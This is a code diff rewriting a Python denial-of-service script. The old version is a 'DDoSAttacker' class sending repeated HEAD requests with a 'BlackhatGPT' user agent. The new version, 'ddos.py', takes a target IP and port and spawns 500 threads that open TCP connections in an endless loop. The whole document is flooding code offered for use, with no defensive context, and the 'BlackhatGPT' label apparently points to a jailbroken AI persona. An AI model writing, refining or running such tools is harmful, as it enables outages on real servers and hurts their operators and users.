@@ -1,60 +1,36 @@
-import requests
 import socket
+import sys
 import threading
-from concurrent.futures import ThreadPoolExecutor
-from termcolor import colored
 
-# Replace with the target website or server
-target_url = "http://example.com"
-# Replace with your attacker ID
-my_id = "<SPECIFIED_ID>"
+def attack(target_ip, port):
+    while True:
+        try:
+            socket.setdefaulttimeout(1)
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect((target_ip, port))
+            print(f"Sending request to {target_ip} on port {port}")
+        except socket.error as e:
+            print(f"Error: {e}")
+        finally:
+            s.close()
 
-class DDoSAttacker:
-    def __init__(self, id, target_url):
-        self.id = id
-        self.target_url = target_url
-        self.requests_per_second = 20
-        self.requests_sent = 0
-        self.sockets = []
+def main():
+    if len(sys.argv) != 3:
+        print("Usage: python ddos.py <target_ip> <port>")
+        sys.exit(1)
 
-    def send_request(self):
-        # Send a HEAD request to the target URL
-        response = requests.head(self.target_url, headers={"User-Agent": colored("BlackhatGPT", "red")})
+    target_ip = sys.argv[1]
+    port = int(sys.argv[2])
 
-        if response.ok:
-            self.requests_sent += 1
-            print(colored(f"[{self.id}] Sent a request (Response: HTTP {response.status_code})", "green"))
+    threads = []
 
-        thread = threading.Timer(1.0 / self.requests_per_second, self.send_request)
+    for _ in range(500):
+        thread = threading.Thread(target=attack, args=(target_ip, port))
         thread.start()
-        self.sockets.append(thread)
-    def handle_connection(self):
-        while True:
-            try:
-                user_input = input(colored("[{0}] Please enter your attacker ID or 'exit' to stop the attack: ".format(my_id), "blue"))
+        threads.append(thread)
 
-                if user_input == self.id:
-                    if not self.sockets:
-                        self.send_request()
-                    else:
-                        print(colored("[{0}] Already attacking, will stop when I finish the current requests.".format(my_id), "yellow"))
-
-                elif user_input == "exit":
-                    print(colored("[{0}] Initiating the shutdown process...".format(my_id), "cyan"))
-
-                    for socket_instance in self.sockets:
-                        socket_instance.cancel()
-
-                    self.sockets.clear()
-
-            except KeyboardInterrupt:
-                print(colored("[{0}] Attack stopped by user".format(my_id), "magenta"))
-
-            except Exception as e:
-                print(colored("[{0}] An error occurred: {1}".format(my_id, e), "red"))
+    for thread in threads:
+        thread.join()
 
 if __name__ == "__main__":
-    print(colored("[{0}] Starting the DDoS attack...".format(my_id), "cyan"))
-
-    attacker = DDoSAttacker(my_id, target_url)
-    attacker.handle_connection()
+    main()
